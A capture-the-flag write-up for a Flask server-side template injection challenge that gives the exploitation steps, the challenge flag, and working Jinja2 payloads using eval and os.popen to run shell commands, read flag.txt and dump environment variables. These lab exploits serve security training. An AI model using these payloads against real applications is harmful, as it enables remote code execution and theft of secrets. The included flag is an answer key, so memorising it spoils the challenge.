# CTF Challenge: Flask SSTI Exploitation

## Challenge Description
Participants are provided with a Flask-based web application that allows users to create posts with a `Title`, `Theme`, and `Content`. The application is vulnerable to **Server-Side Template Injection (SSTI)**, which allows attackers to execute arbitrary code on the server.

The goal of the challenge is to exploit the SSTI vulnerability to read the contents of a hidden file named `flag.txt` located on the server.

---

## Challenge Setup
- **Application**: A Flask web application with user authentication, post creation, and profile viewing.
- **Vulnerability**: The `Theme` field in the post creation form is vulnerable to SSTI.
- **Flag**: The flag is stored in a file named `flag.txt` in the root directory of the application.

---

## Vulnerability Details
The vulnerability exists in the `Theme` field of the post creation form. When a user creates a post, the `Theme` field is rendered unsafely in the profile page using Jinja2 templating. This allows attackers to inject malicious Jinja2 templates and execute arbitrary code on the server.

For example, the following payload can be used to perform a simple calculation:
```jinja2
{{ 7 * 7 }}
This will render as 49 in the profile page, confirming the SSTI vulnerability.

Exploitation Steps
Create a Post:

Go to the post creation page (/posting).

Enter a Title and Content.

In the Theme field, enter a malicious payload to exploit the SSTI vulnerability.

Exploit SSTI:

Use the following payload to read the contents of flag.txt:

jinja2
Copy
{{ self.__init__.__globals__.__builtins__.eval("__import__('os').popen('cat /path/to/flag.txt').read()") }}
Replace /path/to/flag.txt with the actual path to the flag.txt file.

View the Profile:

Go to the profile page (/users/<user_id>).

The Theme field will display the contents of flag.txt.

Example Payloads
Simple SSTI Test:

jinja2
Copy
{{ 7 * 7 }}
Output: 49

Read Environment Variables:

jinja2
Copy
{{ self.__init__.__globals__.__builtins__.eval("__import__('os').environ") }}
Output: A dictionary of environment variables.

Read flag.txt:

jinja2
Copy
{{ self.__init__.__globals__.__builtins__.eval("__import__('os').popen('cat ./flag.txt').read()") }}
Output: The contents of flag.txt.
```
## FLAG 

CTF{khoya_7na_mzrobin_3tih_flag_a_rabi3a}